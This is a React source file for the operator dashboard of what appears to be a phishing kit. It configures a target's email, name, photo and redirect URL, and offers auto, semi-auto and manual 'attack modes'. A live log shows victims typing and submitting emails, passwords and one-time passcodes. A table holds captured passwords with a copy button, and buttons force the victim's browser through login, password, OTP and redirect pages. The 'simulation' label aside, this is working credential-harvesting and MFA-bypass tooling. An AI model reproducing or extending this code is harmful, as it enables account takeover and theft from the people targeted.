
      
"use client";

import { useState, useEffect, useCallback, ChangeEvent } from "react";
import type { AppState } from "@/lib/state";
import { useForm, type SubmitHandler, Controller } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import Image from "next/image";
import { cn } from "@/lib/utils";

import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import { Separator } from "@/components/ui/separator";
import { Badge } from "@/components/ui/badge";
import { History, Trash2, UserCircle, Moon, Sun, ShieldQuestion, CheckCircle2, AlertCircle, Mail, KeyRound, Forward, Eye, Clipboard, Type, Lock, Unlock } from "lucide-react";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { useTheme } from "next-themes";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { format, isValid } from "date-fns";

type ConfigFormData = {
  targetEmail: string;
  targetName: string;
  targetProfilePicture: string;
  redirectUrl: string;
  attackMode: 'auto' | 'manual' | 'semi-auto';
};

const configSchema = z.object({
    targetEmail: z.string().email({ message: "Invalid email address." }),
    targetName: z.string().min(1, { message: "Name is required." }),
    targetProfilePicture: z.string().url({ message: "Please enter a valid URL." }).or(z.string().optional()).or(z.literal('')),
    redirectUrl: z.string().url({ message: "Please enter a valid URL." }),
    attackMode: z.enum(['auto', 'manual', 'semi-auto']),
});

export function AdminDashboard() {
  const [state, setState] = useState<AppState | null>(null);
  const [isUploading, setIsUploading] = useState(false);
  const [imagePreview, setImagePreview] = useState<string | null>(null);
  const [selectedFile, setSelectedFile] = useState<File | null>(null);
  const { toast } = useToast();
  const { setTheme } = useTheme();
  const [isFormFocused, setIsFormFocused] = useState(false);
  const [activeTab, setActiveTab] = useState("live");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const {
    register,
    handleSubmit,
    reset,
    setValue,
    watch,
    control,
    formState: { errors },
  } = useForm<ConfigFormData>({
    resolver: zodResolver(configSchema),
    defaultValues: {
      targetEmail: '',
      targetName: '',
      targetProfilePicture: '',
      redirectUrl: '',
      attackMode: 'auto'
    }
  });

  const profilePictureUrl = watch("targetProfilePicture");
  const isConfigLocked = state?.config?.isLocked ?? false;

  const fetchState = useCallback(async () => {
    try {
      const res = await fetch("/api/state?view=admin");
      if (res.ok) {
        const data = await res.json();
        setState(data);
        if (!isFormFocused) {
          reset(data.config);
        }
      }
    } catch (error) {
      console.error("Failed to fetch state:", error);
      toast({
        variant: "destructive",
        title: "Network Error",
        description: "Could not connect to the server. Please check your connection.",
      });
    }
  }, [reset, isFormFocused, toast]);

  useEffect(() => {
    fetchState();
    const interval = setInterval(fetchState, 2000);
    return () => clearInterval(interval);
  }, [fetchState]);

  const handleFileChange = (e: ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      setSelectedFile(file);
      const reader = new FileReader();
      reader.onloadend = () => {
        setImagePreview(reader.result as string);
      };
      reader.readAsDataURL(file);
    }
  };

  const uploadImage = async (file: File): Promise<string | null> => {
    setIsUploading(true);
    const formData = new FormData();
    formData.append("image", file);
    try {
        const response = await fetch('/api/upload', {
            method: 'POST',
            body: formData,
        });
        const result = await response.json();
        if (response.ok) {
            return result.url;
        } else {
            console.error("Image upload failed:", result);
            toast({ variant: 'destructive', title: 'Upload Failed', description: result.error || 'Unknown error' });
            return null;
        }
    } catch (error) {
        console.error('Image upload failed:', error);
        toast({ variant: 'destructive', title: 'Error', description: 'Could not upload image.' });
        return null;
    } finally {
        setIsUploading(false);
    }
  };
  
  const handleAttackModeChange = async (mode: 'auto' | 'manual' | 'semi-auto') => {
    setValue('attackMode', mode);
    try {
      const res = await fetch("/api/state", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "setAttackMode", mode }),
      });
      if (res.ok) {
        toast({ title: "Attack Mode Updated", description: `Switched to ${mode} mode.` });
        fetchState();
      } else {
        throw new Error("Failed to switch mode");
      }
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Error",
        description: "Could not switch attack mode.",
      });
    }
  };

  const onConfigSubmit: SubmitHandler<ConfigFormData> = async (data) => {
    let finalData = { ...data, isLocked: isConfigLocked };
    setIsSubmitting(true);
    try {
      if (selectedFile) {
        const uploadedUrl = await uploadImage(selectedFile);
        if (uploadedUrl) {
          finalData.targetProfilePicture = uploadedUrl;
          setValue("targetProfilePicture", uploadedUrl);
          setSelectedFile(null);
          setImagePreview(null);
        } else {
            return; 
        }
      }

      const res = await fetch("/api/state", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "setConfig", config: finalData }),
      });
      const resData = await res.json();
      if (res.ok) {
        toast({ title: "Success", description: "Configuration saved." });
        fetchState();
      } else {
        throw new Error(resData.error || "Failed to save config");
      }
    } catch (error) {
        const errorMessage = error instanceof Error ? error.message : "Could not save configuration.";
        toast({
            variant: "destructive",
            title: "Error",
            description: errorMessage,
        });
    } finally {
        setIsSubmitting(false);
    }
  };
  
  const handleToggleLock = async () => {
    try {
      const res = await fetch("/api/state", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "toggleConfigLock", isLocked: !isConfigLocked }),
      });
      if (res.ok) {
        toast({ title: "Success", description: `Configuration ${!isConfigLocked ? 'locked' : 'unlocked'}.` });
        fetchState();
      } else {
        throw new Error("Failed to toggle lock");
      }
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Error",
        description: "Could not update lock state.",
      });
    }
  };

  const handleClearVictimData = async () => {
    if (window.confirm("Are you sure you want to clear all captured victim data? This cannot be undone.")) {
      try {
        await fetch("/api/state", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ action: "clearVictimData" }),
        });
        toast({ title: "Victim Data Cleared", description: "All captured data has been removed." });
        fetchState();
      } catch (error) {
        toast({ variant: "destructive", title: "Error", description: "Could not clear victim data." });
      }
    }
  };

  const handleDeletePassword = async (passwordId: string) => {
    if (window.confirm("Are you sure you want to delete this password entry?")) {
      try {
        const res = await fetch("/api/state", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ action: "deletePassword", passwordId }),
        });
        if (res.ok) {
          toast({ title: "Password Deleted", description: "The entry has been removed." });
          fetchState();
        } else {
          throw new Error("Failed to delete password");
        }
      } catch (error) {
        toast({ variant: "destructive", title: "Error", description: "Could not delete password." });
      }
    }
  };

  const handleResetVictimState = async () => {
    if (window.confirm("Are you sure you want to reset the victim's session? All captured data for this session will be cleared, but your configuration will be kept.")) {
      try {
        await fetch("/api/state", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ action: "clearVictimData" }),
        });
        toast({ title: "Victim Session Reset", description: "The victim's session has been reset." });
        fetchState();
      } catch (error) {
        toast({ variant: "destructive", title: "Error", description: "Could not reset victim session." });
      }
    }
  };


  const handleControlClick = async (page: string) => {
    try {
      await fetch('/api/state', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'setVictimPage', page }),
      });
      toast({ title: 'Command Sent', description: `Forcing victim view to "${page}" page.` });
    } catch (error) {
       toast({ variant: 'destructive', title: 'Error', description: 'Failed to send command.' });
    }
  };

  const getAttackLog = () => {
    if (!state) return [];
    
    const log = [];
    const { victim } = state;

    const passwordCount = state.victim.passwords ? Object.values(state.victim.passwords).length : 0;

    if (!victim.email && passwordCount === 0 && !victim.otp) {
        log.push({ icon: Eye, text: `Victim is viewing the phishing page.` });
    }

    if (victim.isTyping) {
      log.push({ icon: Type, text: `Victim is typing credentials...` });
    }

    if (victim.email) {
      log.push({ icon: Mail, text: `Victim submitted email: ${victim.email}` });
    }
    
    if (passwordCount > 0) {
      log.push({ icon: KeyRound, text: `Captured ${passwordCount} password(s).` });
    }
    
    if (victim.currentPage === 'error') {
       log.push({ icon: AlertCircle, text: `Victim is seeing a simulated error.` });
    }

    if (victim.otp) {
       log.push({ icon: ShieldQuestion, text: `Victim submitted OTP: ${victim.otp}` });
    }
    
    if (victim.currentPage === 'redirect') {
      log.push({ icon: Forward, text: `Redirecting victim to the final URL.` });
      log.push({ icon: CheckCircle2, text: `Attack simulation completed successfully.` });
    }

    return log.reverse();
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text).then(() => {
      toast({ title: "Copied!", description: "Password copied to clipboard." });
    }, (err) => {
      toast({ variant: "destructive", title: "Failed to copy", description: "Could not copy password." });
      console.error('Could not copy text: ', err);
    });
  };

  const attackLog = getAttackLog();
  const capturedPasswords = state?.victim.passwords ? 
    Object.entries(state.victim.passwords).map(([id, data]) => ({ id, ...data as any })) 
    : [];

  return (
    <div className="w-full max-w-6xl mx-auto p-2 sm:p-4">
        <Tabs defaultValue="live" className="w-full" onValueChange={setActiveTab}>
            <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between mb-4 gap-4">
                <TabsList className="grid w-full sm:w-fit grid-cols-3">
                    <TabsTrigger value="live">Live Dashboard</TabsTrigger>
                    <TabsTrigger value="data">Captured Data</TabsTrigger>
                    <TabsTrigger value="config">Configuration</TabsTrigger>
                </TabsList>
                <div className="flex items-center justify-end gap-2">
                    <DropdownMenu>
                      <DropdownMenuTrigger asChild>
                        <Button variant="outline" size="icon">
                          <Sun className="h-[1.2rem] w-[1.2rem] rotate-0 scale-100 transition-all dark:-rotate-90 dark:scale-0" />
                          <Moon className="absolute h-[1.2rem] w-[1.2rem] rotate-90 scale-0 transition-all dark:rotate-0 dark:scale-100" />
                          <span className="sr-only">Toggle theme</span>
                        </Button>
                      </DropdownMenuTrigger>
                      <DropdownMenuContent align="end">
                        <DropdownMenuItem onClick={() => setTheme("light")}>
                          Light
                        </DropdownMenuItem>
                        <DropdownMenuItem onClick={() => setTheme("dark")}>
                          Dark
                        </DropdownMenuItem>
                        <DropdownMenuItem onClick={() => setTheme("system")}>
                          System
                        </DropdownMenuItem>
                      </DropdownMenuContent>
                    </DropdownMenu>
                    <Button variant="outline" size="icon" onClick={handleResetVictimState}><History className="h-4 w-4" /></Button>
                    <Button variant="destructive" size="icon" onClick={handleClearVictimData} disabled={activeTab !== 'data'}>
                        <Trash2 className="h-4 w-4" />
                    </Button>
                </div>
            </div>

            <TabsContent value="live">
                <Card>
                  <CardHeader>
                    <CardTitle>Live Attack Dashboard</CardTitle>
                    <CardDescription>Real-time monitoring of the simulation.</CardDescription>
                  </CardHeader>
                  <CardContent className="space-y-8">
                     <div className="space-y-4">
                        <h3 className="font-semibold text-lg">Victim Status</h3>
                        <div className="flex flex-col sm:flex-row items-start sm:items-center gap-4 p-4 bg-muted rounded-lg">
                          <div className="flex items-center gap-2">Current Page: <Badge>{state?.victim.currentPage || 'N/A'}</Badge></div>
                          <div className="flex items-center gap-2">Attempts: <Badge variant="secondary">{state?.victim.attempts || 0}</Badge></div>
                          <div className="flex items-center gap-2">Attack Mode: <Badge variant="outline">{state?.config.attackMode || 'N/A'}</Badge></div>
                        </div>
                     </div>
                     <Separator />
                     <div className="space-y-4">
                        <h3 className="font-semibold text-lg">Live Attack Log</h3>
                        <div className="p-4 bg-muted rounded-lg min-h-[150px] space-y-3">
                           {attackLog.length > 0 ? (
                            attackLog.map((log, index) => (
                               <div key={index} className="flex items-center gap-3 text-sm">
                                <log.icon className="h-5 w-5 text-muted-foreground" />
                                <span>{log.text}</span>
                               </div>
                            ))
                           ) : (
                             <div className="flex h-full min-h-[120px] items-center justify-center text-sm text-muted-foreground">
                                Waiting for victim...
                             </div>
                           )}
                        </div>
                    </div>
                     <Separator />
                      <div className="space-y-4">
                          <h3 className="font-semibold text-lg">Manual Controls</h3>
                          <CardDescription className="mb-4">Force the victim's browser to a specific page. This only works when in "Manual" attack mode.</CardDescription>
                          <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-6 gap-2">
                              <Button 
                                variant={state?.victim.currentPage === 'login' ? "default" : "outline"}
                                onClick={() => handleControlClick('login')}
                                className={cn("h-12", state?.victim.currentPage === 'login' && "animate-shine")}
                                disabled={state?.config.attackMode !== 'manual'}
                              >
                                Login
                              </Button>
                              <Button 
                                variant={state?.victim.currentPage === 'password' ? "default" : "outline"}
                                onClick={() => handleControlClick('password')}
                                className={cn("h-12", state?.victim.currentPage === 'password' && "animate-shine")}
                                 disabled={state?.config.attackMode !== 'manual'}
                              >
                                Password
                              </Button>
                              <Button 
                                variant={state?.victim.currentPage === 'pwCatch' ? "default" : "outline"}
                                onClick={() => handleControlClick('pwCatch')}
                                className={cn("h-12", state?.victim.currentPage === 'pwCatch' && "animate-shine")}
                                 disabled={state?.config.attackMode !== 'manual'}
                              >
                                Pw-Catch
                              </Button>
                              <Button 
                                variant={state?.victim.currentPage === 'verify' ? "default" : "outline"}
                                onClick={() => handleControlClick('verify')}
                                className={cn("h-12", state?.victim.currentPage === 'verify' && "animate-shine")}
                                 disabled={state?.config.attackMode !== 'manual'}
                              >
                                Verify
                              </Button>
                              <Button 
                                variant={state?.victim.currentPage === 'otp' ? "default" : "outline"}
                                onClick={() => handleControlClick('otp')}
                                className={cn("h-12", state?.victim.currentPage === 'otp' && "animate-shine")}
                                 disabled={state?.config.attackMode !== 'manual'}
                              >
                                OTP
                              </Button>
                              <Button 
                                variant={state?.victim.currentPage === 'redirect' ? "default" : "outline"}
                                onClick={() => handleControlClick('redirect')}
                                className={cn("h-12", state?.victim.currentPage === 'redirect' && "animate-shine")}
                                 disabled={state?.config.attackMode !== 'manual'}
                              >
                                Redirect
                              </Button>
                          </div>
                      </div>
                  </CardContent>
                </Card>
            </TabsContent>
            <TabsContent value="data">
              <Card>
                  <CardHeader>
                    <CardTitle>Captured Data</CardTitle>
                    <CardDescription>All data captured from the victim during the simulation.</CardDescription>
                  </CardHeader>
                  <CardContent className="space-y-6">
                    <div className="space-y-2">
                        <Label>Captured Passwords</Label>
                        <div className="border rounded-lg">
                            <Table>
                                <TableHeader>
                                    <TableRow>
                                        <TableHead>Email</TableHead>
                                        <TableHead>Password</TableHead>
                                        <TableHead>Attack Mode</TableHead>
                                        <TableHead>Attacker</TableHead>
                                        <TableHead className="w-[150px] sm:w-[200px]">Timestamp</TableHead>
                                        <TableHead className="text-right w-[120px]">Actions</TableHead>
                                    </TableRow>
                                </TableHeader>
                                <TableBody>
                                    {capturedPasswords.length > 0 ? (
                                        capturedPasswords.map((p) => {
                                            const date = new Date(p.timestamp);
                                            return (
                                                <TableRow key={p.id}>
                                                    <TableCell className="font-mono text-sm break-all">{p.email}</TableCell>
                                                    <TableCell className="font-mono text-sm break-all">{p.value}</TableCell>
                                                    <TableCell><Badge variant="outline">{p.attackMode}</Badge></TableCell>
                                                    <TableCell>{p.attacker}</TableCell>
                                                    <TableCell className="font-mono text-xs">
                                                        {isValid(date) ? format(date, "yyyy-MM-dd HH:mm:ss") : 'Invalid Date'}
                                                    </TableCell>
                                                    <TableCell className="text-right">
                                                      <Button variant="ghost" size="icon" onClick={() => copyToClipboard(p.value)}>
                                                          <Clipboard className="h-4 w-4" />
                                                      </Button>
                                                      <Button variant="ghost" size="icon" onClick={() => handleDeletePassword(p.id)}>
                                                          <Trash2 className="h-4 w-4 text-destructive" />
                                                      </Button>
                                                    </TableCell>
                                                </TableRow>
                                            );
                                        })
                                    ) : (
                                        <TableRow>
                                            <TableCell colSpan={6} className="h-24 text-center">
                                                No passwords captured yet.
                                            </TableCell>
                                        </TableRow>
                                    )}
                                </TableBody>
                            </Table>
                        </div>
                    </div>
                    <div className="space-y-2">
                        <Label>One-Time Password (OTP)</Label>
                       <div className="p-4 bg-muted rounded-lg font-mono text-sm break-all">
                          {state?.victim.otp || "---"}
                        </div>
                    </div>
                  </CardContent>
              </Card>
            </TabsContent>
            <TabsContent value="config">
                <form 
                  onSubmit={handleSubmit(onConfigSubmit)} 
                  className="grid md:grid-cols-2 gap-6"
                  onFocus={() => setIsFormFocused(true)}
                  onBlur={() => setIsFormFocused(false)}
                >
                 <Card>
                    <CardHeader>
                        <CardTitle>Attack Mode</CardTitle>
                        <CardDescription>Select the simulation mode. Changes save instantly.</CardDescription>
                    </CardHeader>
                    <CardContent>
                         <Controller
                            name="attackMode"
                            control={control}
                            render={({ field }) => (
                                <RadioGroup
                                    onValueChange={(value: 'auto' | 'manual' | 'semi-auto') => handleAttackModeChange(value)}
                                    value={field.value}
                                    className="grid grid-cols-1 gap-4"
                                    disabled={isConfigLocked}
                                >
                                    <Label className={cn("flex flex-col items-start gap-3 rounded-lg border p-4 cursor-pointer transition-colors hover:bg-accent/50 has-[input:checked]:bg-accent has-[input:checked]:border-primary", isConfigLocked && "cursor-not-allowed opacity-50")}>
                                        <div className="flex items-center justify-between w-full">
                                           <div className="font-semibold">Auto Mode</div>
                                           <RadioGroupItem value="auto" id="auto" disabled={isConfigLocked}/>
                                        </div>
                                        <p className="text-sm text-muted-foreground">
                                            A streamlined flow: Email → Password → Redirect. Captures initial credentials then redirects.
                                        </p>
                                    </Label>
                                    <Label className={cn("flex flex-col items-start gap-3 rounded-lg border p-4 cursor-pointer transition-colors hover:bg-accent/50 has-[input:checked]:bg-accent has-[input:checked]:border-primary", isConfigLocked && "cursor-not-allowed opacity-50")}>
                                        <div className="flex items-center justify-between w-full">
                                           <div className="font-semibold">Semi-Auto (Fast Catch)</div>
                                           <RadioGroupItem value="semi-auto" id="semi-auto" disabled={isConfigLocked} />
                                        </div>
                                        <p className="text-sm text-muted-foreground">
                                           A single password capture page that uses the Target Config and then redirects.
                                        </p>
                                    </Label>
                                    <Label className={cn("flex flex-col items-start gap-3 rounded-lg border p-4 cursor-pointer transition-colors hover:bg-accent/50 has-[input:checked]:bg-accent has-[input:checked]:border-primary", isConfigLocked && "cursor-not-allowed opacity-50")}>
                                         <div className="flex items-center justify-between w-full">
                                            <div className="font-semibold">Manual Mode</div>
                                            <RadioGroupItem value="manual" id="manual" disabled={isConfigLocked} />
                                         </div>
                                        <p className="text-sm text-muted-foreground">
                                           A multi-step, interactive flow that you control from the dashboard. Good for complex scenarios.
                                        </p>
                                    </Label>
                                </RadioGroup>
                            )}
                         />
                    </CardContent>
                 </Card>
                <Card>
                  <CardHeader className="flex flex-row items-center justify-between">
                    <div>
                        <CardTitle>Target Configuration</CardTitle>
                        <CardDescription>Set up the target and simulation parameters.</CardDescription>
                    </div>
                    <Button variant="outline" size="icon" onClick={handleToggleLock}>
                        {isConfigLocked ? <Lock className="h-4 w-4" /> : <Unlock className="h-4 w-4" />}
                        <span className="sr-only">{isConfigLocked ? 'Unlock' : 'Lock'}</span>
                    </Button>
                  </CardHeader>
                  <CardContent className="space-y-4">
                      <div>
                        <Label htmlFor="targetEmail">Target Email</Label>
                        <Input id="targetEmail" {...register("targetEmail")} disabled={isConfigLocked} />
                        {errors.targetEmail && <p className="text-sm text-destructive mt-1">{errors.targetEmail.message}</p>}
                      </div>
                      <div>
                        <Label htmlFor="targetName">Target Name</Label>
                        <Input id="targetName" {...register("targetName")} disabled={isConfigLocked} />
                        {errors.targetName && <p className="text-sm text-destructive mt-1">{errors.targetName.message}</p>}
                      </div>
                      <div>
                        <Label>Target Profile Picture</Label>
                        <div className="flex items-center gap-4 mt-2">
                          {imagePreview || (profilePictureUrl && profilePictureUrl.startsWith('http')) ? (
                            <Image 
                              src={imagePreview || profilePictureUrl!}
                              alt="Profile Preview"
                              width={64}
                              height={64}
                              className="rounded-full object-cover w-16 h-16"
                              data-ai-hint="person avatar" 
                            />
                          ) : (
                            <div className="w-16 h-16 rounded-full bg-muted flex items-center justify-center">
                                <UserCircle className="w-10 h-10 text-muted-foreground" />
                            </div>
                          )}
                           <div className="flex-grow">
                             <Input id="targetProfilePictureFile" type="file" accept="image/*" onChange={handleFileChange} disabled={isConfigLocked || isUploading} />
                           </div>
                        </div>
                        {errors.targetProfilePicture && <p className="text-sm text-destructive mt-1">{errors.targetProfilePicture.message}</p>}
                      </div>
                      <div>
                        <Label htmlFor="redirectUrl">Final Redirect URL</Label>
                        <Input id="redirectUrl" {...register("redirectUrl")} disabled={isConfigLocked} />
                        {errors.redirectUrl && <p className="text-sm text-destructive mt-1">{errors.redirectUrl.message}</p>}
                      </div>
                  </CardContent>
                </Card>
                 <div className="md:col-span-2">
                    <Button type="submit" className="w-full h-12" disabled={isUploading || isSubmitting || isConfigLocked}>
                        {isUploading ? "Uploading..." : isSubmitting ? "Saving..." : "Save Configuration"}
                    </Button>
                 </div>
                </form>
            </TabsContent>
        </Tabs>
    </div>
  );
}
